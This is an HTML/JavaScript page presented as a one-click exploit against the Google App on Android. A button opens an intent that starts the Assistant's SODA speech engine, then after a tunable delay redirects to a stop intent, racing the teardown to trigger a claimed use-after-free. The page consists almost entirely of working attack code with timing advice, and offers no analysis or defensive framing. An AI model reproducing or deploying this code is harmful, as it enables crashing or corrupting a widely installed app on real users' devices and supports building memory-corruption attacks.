<!DOCTYPE html>
<html>
<head>
    <title>Google App SODA Exploit</title>

        body { font-family: sans-serif; text-align: center; margin-top: 50px; }
        button { padding: 15px 30px; font-size: 18px; background: #d93025; color: white; border: none; border-radius: 5px; }

<body>
    <h2>Google App Tier 1 Exploit</h2>
    <p>Click below to trigger the SODA UAF via Intents.</p>
    <button id="attackBtn">Run 1-Click Exploit</button>

    <script>
        document.getElementById("attackBtn").addEventListener("click", function() {
            
            // 1. Define the Intents using Android's intent:// scheme syntax
            // This forces Chrome to route the link directly to the Google App
            var startIntent = "intent://assistant.google.com/services/invoke#Intent;scheme=https;package=com.google.android.googlequicksearchbox;end";
            
            // We use the wuwa/stop endpoint which kills active voice sessions
            var stopIntent = "intent://assistant.google.com/wuwa/stop#Intent;scheme=http;package=com.google.android.googlequicksearchbox;end";

            // 2. Open the Start Intent to spin up the SODA Engine
            var attackWindow = window.open(startIntent, '_blank');

            // 3. The Race Condition!
            // Wait for the Google App to allocate the SODA C++ object and start the audio thread.
            // 800ms is a good starting guess for a cold Assistant launch from Chrome.
            setTimeout(function() {
                
                // Redirect that same window to the Stop intent to trigger the flawed Read-Lock teardown
                attackWindow.location.href = stopIntent;
                
                console.log("[*] Exploit fired.");
                
            }, 800); // <-- You will need to tune this delay (e.g., 200ms, 500ms, 1200ms)
        });
    </script>
</body>
